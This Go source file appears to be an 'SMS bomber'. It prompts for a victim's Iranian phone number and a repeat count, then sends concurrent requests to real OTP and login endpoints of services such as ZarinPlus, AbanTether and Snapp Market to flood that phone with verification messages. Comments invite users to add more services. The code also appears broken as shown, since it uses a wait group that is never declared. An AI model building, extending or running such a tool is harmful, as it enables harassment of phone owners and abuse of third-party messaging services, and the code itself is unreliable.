package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"net/http/cookiejar"
)

// Code by @monsmain - modified by Coding Partner

// ساختار برای نگهداری جزئیات هر سرویس OTP
type OTPRequest struct {
	URL    string
	Method string // مثلاً "POST" یا "GET"
	Type   string // مثلاً "json", "form", "get" (برای تعیین نوع بدنه درخواست POST یا GET بدون بدنه)
	// اینجا می تونید فیلدهای بیشتری برای تنظیمات خاص هر URL اضافه کنید، مثلاً
	// Headerها، کلید مورد استفاده برای شماره تلفن در JSON/Form، یا فرمت شماره تلفن لازم.
	// فعلاً بصورت پیشفرض برای مثال‌هایی که می‌ذارم، کلیدها رو "phone" یا "cellphone" در نظر می‌گیرم.
	// شما باید این قسمت‌ها رو بر اساس نیاز هر URL تنظیم کنید.
	PhoneKey string // کلید مورد استفاده برای شماره تلفن در JSON یا Form data
	// مثال: اگر سرویسی شماره رو در JSON با کلید "mobile" می‌خواد، اینجا بذارید "mobile"
}

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// ساختار برای نتایج ارسال درخواست که شامل URL و وضعیت هست
type RequestResult struct {
	URL        string
	StatusCode int
}

// توابع ارسال درخواست با تغییر برای گزارش URL در کانال وضعیت RequestResult
func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- RequestResult) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- RequestResult{URL: url, StatusCode: 0} // 0 می‌تواند نشان دهنده لغو باشد
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- RequestResult{URL: url, StatusCode: http.StatusInternalServerError}
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- RequestResult{URL: url, StatusCode: http.StatusInternalServerError}
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		// اینجا می تونید Headerهای دیگه ای که برای این سرویس لازم دارید اضافه کنید

		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- RequestResult{URL: url, StatusCode: http.StatusInternalServerError}
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- RequestResult{URL: url, StatusCode: 0}
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- RequestResult{URL: url, StatusCode: http.StatusInternalServerError}
				return
			}
		}

		ch <- RequestResult{URL: url, StatusCode: resp.StatusCode}
		resp.Body.Close()
		return // موفقیت آمیز بود، دیگه تلاش مجدد نیاز نیست
	}
}

func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- RequestResult) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- RequestResult{URL: url, StatusCode: 0}
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- RequestResult{URL: url, StatusCode: http.StatusInternalServerError}
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		// اینجا می تونید Headerهای دیگه ای که برای این سرویس لازم دارید اضافه کنید

		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- RequestResult{URL: url, StatusCode: http.StatusInternalServerError}
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- RequestResult{URL: url, StatusCode: 0}
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- RequestResult{URL: url, StatusCode: http.StatusInternalServerError}
				return
			}
		}

		ch <- RequestResult{URL: url, StatusCode: resp.StatusCode}
		resp.Body.Close()
		return // موفقیت آمیز بود
	}
}

func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- RequestResult) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- RequestResult{URL: url, StatusCode: 0}
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) // GET request has no body
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- RequestResult{URL: url, StatusCode: http.StatusInternalServerError}
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		// اینجا می تونید Headerهای دیگه ای که برای این سرویس لازم دارید اضافه کنید

		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- RequestResult{URL: url, StatusCode: http.StatusInternalServerError}
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- RequestResult{URL: url, StatusCode: 0}
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- RequestResult{URL: url, StatusCode: http.StatusInternalServerError}
				return
			}
		}

		ch <- RequestResult{URL: url, StatusCode: resp.StatusCode}
		resp.Body.Close()
		return // موفقیت آمیز بود
	}
}

// توابع فرمت شماره تلفن
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p)
	if len(p) >= 10 {
		if len(p) >= 10 {
			return p[0:3] + " " + p[3:6] + " " + p[6:10]
		}
		return p
	}
	return p
}

func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}

func main() {
	clearScreen()

	// بنر ASCII
	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.
                         .:   =#-:-----:
                           **%@#%@@@#*+==:
                       :=*%@@@@@@@@@@@@@@%#*=:
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
            #@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:
            *@@%#             -@@@@@@.            #@@@+
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#
             :@@*            =%@@@@@@%-  faster    *@@:
              #@@%         .*@@@@#%@@@%+.         %@@+
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
                      #@@@@@@@@@@@@@@@@@@@@@@+
                       *@@@@@@@@@@@@@@@@@@@@+
                        +@@%*@@%@@@%%@%*@@%=
                         +%+ %%.+@%:-@* *%-
                          .  %# .%#  %+
                             :.  %+  :.
                                 -:
`)
	fmt.Print("\033[0m")

	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int
	switch strings.ToLower(speedChoice) {
	case "fast":
		numWorkers = 90
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":
		numWorkers = 40
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:
		numWorkers = 40
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar:     cookieJar,
		Timeout: 10 * time.Second, // Timeout برای هر درخواست
	}

	// ===============================================================
	// ======= اینجا لیست سرویس‌های OTP خودتان را تعریف کنید =========
	// ===============================================================

	// نمونه‌هایی برای مثال. شما باید این لیست را با URLهای واقعی خودتان جایگزین کنید
	// و Method و Type و PhoneKey صحیح برای هر URL را مشخص کنید.
	otpServices := []OTPRequest{
		{
			URL:      "https://api.zarinplus.com/user/otp/",
			Method:   "POST",
			Type:     "json",
			PhoneKey: "phone_number", // کلید شماره تلفن در بدنه JSON
			// PhoneKey اینجا فقط یک راهنماست، ما در Switch ازش استفاده می‌کنیم.
		},
		// Firebase Installation را اضافه نمی‌کنیم چون برای ارسال OTP نیست.

		{
			URL:      "https://api.abantether.com/api/v2/auths/register/phone/send",
			Method:   "POST",
			Type:     "json",
			PhoneKey: "phone_number", // کلید شماره تلفن در بدنه JSON
			// PhoneKey اینجا فقط یک راهنماست.
		},
        // نمونه اسنپ مارکت از کد اصلی شما
		{
			URL:      "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass",
			Method:   "POST",
			Type:     "form",
			PhoneKey: "cellphone", // اسنپ مارکت شماره رو با کلید "cellphone" در Form data می‌فرسته
            // توجه: در کد اصلی شما پارامتر cellphone به URL هم اضافه میشد.
            // در این ساختار جدید، منطق ساخت URL یا بدنه داخل switch تعریف میشه.
            // باید مطمئن بشید منطق زیر در switch مطابق نیاز سرویس باشه.
		},
		// URLهای دیگر خود را اینجا اضافه کنید...
		// مثال برای یک سرویس Form Data:
		// {
		// 	URL:      "https://example.com/login",
		// 	Method:   "POST",
		// 	Type:     "form",
		// 	PhoneKey: "mobile", // نام فیلد شماره تلفن در Form data
		// },
		// مثال برای یک سرویس GET با شماره در Query string:
		// {
		// 	URL:      "https://anotherservice.net/send", // فقط آدرس پایه
		// 	Method:   "GET",
		// 	Type:     "get", // نشان دهنده GET بدون بدنه ثابت
		//  PhoneKey: "phone", // نام پارامتر شماره تلفن در Query string
		// },
	}

	if len(otpServices) == 0 {
		fmt.Println("\033[01;31m[-] No OTP services defined. Please add URLs to otpServices slice.\033[0m")
		return // برنامه خاتمه پیدا می‌کند اگر لیستی خالی باشد
	}

	// اندازه کانال وضعیت را بر اساس تعداد درخواست‌های کلی تنظیم می‌کنیم
	ch := make(chan RequestResult, repeatCount*len(otpServices)) // تغییر نوع کانال
	tasks := make(chan func(), repeatCount*len(otpServices))


	// ===============================================================
	// ===============================================================


	// اجرای Workerها
	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task() // اجرای تابع Task
			}
		}()
	}

	// اضافه کردن Taskها به کانال
	for i := 0; i < repeatCount; i++ { // تکرار کل سیکل به تعداد repeatCount
		for _, service := range otpServices { // برای هر سرویس در لیست
			wg.Add(1) // هر درخواست یک Goroutine جدید است
			// ایجاد تابع Task برای این سرویس خاص
			task := func(s OTPRequest, p string, c *http.Client, ctx context.Context, wg *sync.WaitGroup, ch chan<- RequestResult) func() {
				return func() {
					// بر اساس نوع و متد سرویس، درخواست مناسب را ارسال می‌کنیم
					switch {
					case s.Method == "POST" && s.Type == "json":
						// آماده کردن بدنه JSON
						payload := map[string]interface{}{}
						// *** بخش حیاتی: آماده سازی JSON payload بر اساس نیاز هر سرویس ***
						// شما باید این بخش را برای هر سرویس JSON در لیست otpServices سفارشی سازی کنید.
						switch s.URL {
						case "https://api.zarinplus.com/user/otp/":
							// ZarinPlus شماره رو با 98 و بدون صفر اول می‌خواد و فیلد source رو هم نیاز داره
							payload[s.PhoneKey] = getPhoneNumber98NoZero(p)
							payload["source"] = "zarinplus"
						case "https://api.abantether.com/api/v2/auths/register/phone/send":
							// AbanTether شماره رو با صفر اول می‌خواد (طبق مثالی که فرستادید)
							payload[s.PhoneKey] = p
						// Add other JSON services here and customize their payload structure
						// case "https://api.anotherjson.com/send":
						//     payload["mobile"] = getPhoneNumberNoZero(p) // مثال: اگر سرویس دیگر کلید mobile بخواهد
						//     payload["country_code"] = "IR" // مثال: فیلد ثابت دیگر
						default:
							// Fallback generic JSON payload - Use this only if you are sure or as a last resort
							// It uses PhoneKey if set, otherwise defaults to "phone", and uses getPhoneNumberNoZero format.
							if s.PhoneKey != "" {
								payload[s.PhoneKey] = getPhoneNumberNoZero(p)
							} else {
								payload["phone"] = getPhoneNumberNoZero(p)
							}
							fmt.Printf("\033[01;33m[?] Warning: Using generic JSON payload for \033[00;36m%s\033[01;33m. Customize this section!\033[0m\n", s.URL)
						}
						// ***************************************************************

						sendJSONRequest(c, ctx, s.URL, payload, wg, ch)

					case s.Method == "POST" && s.Type == "form":
						// آماده کردن بدنه Form data
						// *** بخش حیاتی: آماده سازی Form data بر اساس نیاز هر سرویس ***
						// شما باید این بخش را برای هر سرویس Form در لیست otpServices سفارشی سازی کنید.
						formData := url.Values{}
                        // Example: Snapp.market form data
						if s.URL == "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass" {
                            // Snapp.market علاوه بر بدنه form data، شماره رو در query string هم می فرستاد
                            // کد sendFormRequest فقط بدنه form data رو می فرسته. اگر query string لازم هست،
                            // باید URL رو اینجا کامل بسازید و به sendFormRequest پاس بدید.
                            // یا logic query string رو به sendFormRequest اضافه کنید (که پیچیده تر میشه).
                            // فعلا مثل کد اصلی شما فقط بدنه form data رو می فرستم و شماره رو در URL نمیذارم چون sendFormRequest نمیگیره.
                            // اگر URL query string هم لازم بود، باید sendFormRequest رو تغییر بدید یا URL رو اینجا دستکاری کنید.
                            // فعلا از فرمت شماره اصلی استفاده می کنم چون مثال شما اینطور بود.
							formData.Set(s.PhoneKey, p) // استفاده از PhoneKey تعریف شده در struct (cellphone)
						} else {
                            // Fallback generic Form data - Use this only if you are sure or as a last resort
							if s.PhoneKey != "" {
								formData.Set(s.PhoneKey, p) // Use original phone format
							} else {
								formData.Set("phone", p) // Default key, original format
							}
                            fmt.Printf("\033[01;33m[?] Warning: Using generic Form data for \033[00;36m%s\033[01;33m. Customize this section!\033[0m\n", s.URL)
                        }
						// ***************************************************************

						sendFormRequest(c, ctx, s.URL, formData, wg, ch)

					case s.Method == "GET" && s.Type == "get":
						// آماده کردن URL با پارامترهای Query string
						// *** بخش حیاتی: آماده سازی URL برای GET بر اساس نیاز هر سرویس ***
						// شما باید این بخش را برای هر سرویس GET در لیست otpServices سفارشی سازی کنید.
						urlWithQuery := s.URL
                        // Example: A GET service that uses "phone" query parameter
						// if s.URL == "https://anotherservice.net/send" {
						// 	urlWithQuery = fmt.Sprintf("%s?phone=%s", s.URL, url.QueryEscape(getPhoneNumberNoZero(p)))
						// } else {
                            // Fallback generic GET URL - Use this only if you are sure or as a last resort
							if s.PhoneKey != "" {
								// فرض می‌کنیم PhoneKey اینجا نام پارامتر Query string است
								urlWithQuery = fmt.Sprintf("%s?%s=%s", s.URL, url.QueryEscape(s.PhoneKey), url.QueryEscape(getPhoneNumberNoZero(p))) // Defaulting to 98 format
							} else {
								urlWithQuery = fmt.Sprintf("%s?phone=%s", s.URL, url.QueryEscape(getPhoneNumberNoZero(p))) // Default param name and 98 format
							}
                            fmt.Printf("\033[01;33m[?] Warning: Using generic GET URL for \033[00;36m%s\033[01;33m. Customize this section!\033[0m\n", s.URL)
                        // }
						// ***************************************************************

						sendGETRequest(c, ctx, urlWithQuery, wg, ch)

					default:
						// اگر متد یا نوع تعریف شده پشتیبانی نمی‌شود یا اشتباه است
						fmt.Printf("\033[01;31m[-] Unknown or unsupported request type/method (%s %s) for URL: \033[00;36m%s\033[0m\n", s.Method, s.Type, s.URL)
						wg.Done() // حتماً Done را صدا بزنید چون Goroutine اصلی برای این درخواست تمام شده
						ch <- RequestResult{URL: s.URL, StatusCode: http.StatusNotImplemented} // گزارش خطا با کد 501 Not Implemented
					}
				}
			}(service, phone, client, ctx, &wg, ch) // پاس دادن متغیرها به Closure
			tasks <- task // ارسال Task به کانال Taskها برای اجرا توسط Workerها
		}
	}

	close(tasks) // بستن کانال Taskها بعد از ارسال همه Taskها

	// Goroutine برای انتظار تا پایان همه Taskها و سپس بستن کانال نتایج
	go func() {
		wg.Wait()
		close(ch) // بستن کانال نتایج وقتی همه Goroutineها Done را صدا زدند
	}()

	// دریافت و نمایش نتایج از کانال
	fmt.Println("\n\033[01;33m[*] Starting to send requests...\033[0m")
	for result := range ch { // خواندن نتایج تا زمانی که کانال بسته شود
		if result.StatusCode >= 400 || result.StatusCode == 0 { // کدهای 4xx یا 5xx یا 0 (لغو)
			fmt.Printf("\033[01;31m[-] Failed or Canceled for \033[00;36m%s\033[01;31m (Status: \033[00;36m%d\033[01;31m)\033[0m\n", result.URL, result.StatusCode)
		} else { // کدهای 2xx یا 3xx (معمولاً موفقیت آمیز)
			fmt.Printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mSucceeded for \033[00;36m%s\033[01;31m (Status: \033[00;36m%d\033[01;31m)\033[0m\n", result.URL, result.StatusCode)
		}
	}

	fmt.Println("\033[01;33m[*] All requests finished.\033[0m")
}
